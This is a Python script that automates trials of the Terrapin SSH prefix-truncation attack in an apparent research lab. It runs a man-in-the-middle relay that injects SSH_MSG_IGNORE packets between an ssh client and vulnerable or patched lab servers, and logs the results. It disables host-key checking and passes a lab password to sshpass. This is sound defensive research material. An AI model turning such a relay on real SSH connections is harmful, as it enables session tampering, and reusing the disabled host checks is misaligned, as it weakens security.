#!/usr/bin/env python3
"""
Roadmap item 3, "Automation" -- the standalone-CLI alternative to a
Metasploit module (see attack/msf/terrapin_rcvincrease.rb for a documented
stub of the other option; this is the one actually exercised end-to-end
in this sandbox, against a real local sshd -- see ATTACK_README.md).

Parameterized exactly as the write-up specified: target, cipher mode, and
message count. One invocation runs N trials of one (target, server,
cipher) condition, starting attack/relay.py as a subprocess for each
trial, running a real `ssh` client through it, and writing a
correctly-named trial log --
logs/<target>_<cipher>_<patched|vulnerable>_auto_trialNN.jsonl -- ready
for scripts/aggregate_logs.py.

Known gap: main's lab has no SSH user keys yet (deck's Status slide,
"Not done yet"). OpenSSH password auth is enabled
(lab/sshd_lab.conf) but the stock `ssh` client can't supply a password
non-interactively on its own, so this tool makes the choice explicit
instead of silently assuming one:
  --identity-file PATH   use pubkey auth (once main's key work lands)
  --use-sshpass          shell out via `sshpass -p "$LAB_SSH_PASSWORD"`
                          (requires the sshpass package -- confirmed
                          installable via apt in this sandbox; not yet
                          added to any Dockerfile in this repo)
Neither is wired up by default; you must pick one, or pass --dry-run.

VALIDATED in this sandbox: --dry-run (prints the commands), and a full
--trials run against a real local OpenSSH 9.6p1 with --use-sshpass (see
ATTACK_README.md "What's validated"). NOT run against the actual
tp-server / tp-server-patched containers (no Docker here) or against
Dropbear/russh/Gitea's SSH.
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from targets import SERVERS, TARGETS, resolve  # noqa: E402

REPO_ROOT = Path(__file__).resolve().parent.parent
RELAY_PY = Path(__file__).resolve().parent / "relay.py"

TRIAL_RE = re.compile(r"_trial(\d+)\.jsonl$")


def next_trial_number(log_dir: Path, prefix: str) -> int:
    existing = [p.name for p in log_dir.glob(f"{prefix}_trial*.jsonl")]
    numbers = [int(m.group(1)) for name in existing if (m := TRIAL_RE.search(name))]
    return (max(numbers) + 1) if numbers else 1


def build_ssh_command(args: argparse.Namespace, listen_port: int, check_command: str) -> list[str]:
    base = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR",
        "-p", str(listen_port),
    ]
    if args.cipher:
        base += ["-c", args.cipher]
    if args.mac:
        base += ["-m", args.mac]
    if args.identity_file:
        base += ["-i", args.identity_file]
    base += [f"{args.ssh_user}@127.0.0.1", "--", check_command]

    if args.use_sshpass:
        return ["sshpass", "-p", args.sshpass_password, *base]
    return base


def run_one_trial(args: argparse.Namespace, trial_num: int) -> int:
    host, port, target = resolve(args.target, args.server)
    cipher_label = args.cipher or "negotiated"
    log_name = f"{args.target}_{cipher_label}_{args.server}_auto_trial{trial_num:02d}.jsonl"
    log_path = args.log_dir / log_name

    relay_cmd = [
        sys.executable, str(RELAY_PY),
        "--listen-host", "127.0.0.1",
        "--listen-port", str(args.listen_port),
        "--backend-host", host,
        "--backend-port", str(port),
        "--mode", args.mode,
        "--message-count", str(args.message_count),
        "--log-file", str(log_path),
        "--once",
    ]
    if args.full_truncation:
        relay_cmd.append("--full-truncation")
    if args.truncation_bytes is not None:
        relay_cmd += ["--truncation-bytes", str(args.truncation_bytes)]

    ssh_cmd = build_ssh_command(args, args.listen_port, target.check_command)

    print(f"\n=== trial {trial_num:02d}: target={args.target} server={args.server} "
          f"cipher={cipher_label} mode={args.mode} ===")
    print(f"  relay: {' '.join(relay_cmd)}")
    safe_ssh_cmd = ["sshpass", "-p", "***"] + ssh_cmd[2:] if args.use_sshpass else ssh_cmd
    print(f"  ssh:   {' '.join(safe_ssh_cmd)}")

    if args.dry_run:
        print("  [dry-run] not executed")
        return 0

    relay_proc = subprocess.Popen(relay_cmd)
    time.sleep(0.6)  # let the relay bind before the client connects
    try:
        ssh_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)
        print(f"  ssh exit={ssh_result.returncode} stdout={ssh_result.stdout.strip()!r} "
              f"stderr={ssh_result.stderr.strip()!r}")
    finally:
        relay_proc.wait(timeout=15)

    print(f"  log: {log_path}")
    return ssh_result.returncode


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", required=True, choices=sorted(TARGETS), help="which SSH-speaking service")
    parser.add_argument("--server", required=True, choices=sorted(SERVERS), help="vulnerable or patched build")
    parser.add_argument("--cipher", default=None, help="forced client cipher, e.g. chacha20-poly1305@openssh.com")
    parser.add_argument("--mac", default=None, help="forced client MAC, e.g. hmac-sha2-256-etm@openssh.com")
    parser.add_argument("--message-count", type=int, default=1, help="SSH_MSG_IGNORE packets to inject")
    parser.add_argument("--mode", choices=["passthrough", "inject_ignore"], default="inject_ignore")
    parser.add_argument("--full-truncation", action="store_true")
    parser.add_argument("--truncation-bytes", type=int, default=None)
    parser.add_argument("--trials", type=int, default=1, help="repeat the condition this many times")
    parser.add_argument("--listen-port", type=int, default=12222)
    parser.add_argument("--ssh-user", default="lab")
    parser.add_argument("--identity-file", default=None)
    parser.add_argument("--use-sshpass", action="store_true")
    parser.add_argument("--sshpass-password", default=None, help="password for --use-sshpass (or set LAB_SSH_PASSWORD)")
    parser.add_argument("--log-dir", type=Path, default=REPO_ROOT / "logs")
    parser.add_argument("--dry-run", action="store_true", help="print commands without running anything")
    args = parser.parse_args()

    if not args.dry_run and not args.identity_file and not args.use_sshpass:
        parser.error(
            "main's lab has no SSH keys yet -- pass --identity-file once one exists, "
            "or --use-sshpass (requires the sshpass package) to use the lab password. "
            "Use --dry-run to see the commands without choosing yet."
        )
    if args.use_sshpass and not args.sshpass_password:
        import os
        args.sshpass_password = os.environ.get("LAB_SSH_PASSWORD")
        if not args.sshpass_password and not args.dry_run:
            parser.error("--use-sshpass needs --sshpass-password or LAB_SSH_PASSWORD set")

    args.log_dir.mkdir(parents=True, exist_ok=True)
    target_obj = TARGETS[args.target]
    if not target_obj.live:
        print(f"[cli] WARNING: target {args.target!r} is marked not-yet-deployed "
              f"({target_obj.note}); continuing anyway since you asked explicitly.",
              file=sys.stderr)

    cipher_label = args.cipher or "negotiated"
    prefix = f"{args.target}_{cipher_label}_{args.server}_auto"
    start = next_trial_number(args.log_dir, prefix)

    exit_codes = []
    for i in range(args.trials):
        exit_codes.append(run_one_trial(args, start + i))

    if args.dry_run:
        return
    failures = sum(1 for c in exit_codes if c != 0)
    print(f"\n[cli] {len(exit_codes) - failures}/{len(exit_codes)} ssh invocations exited 0")


if __name__ == "__main__":
    main()
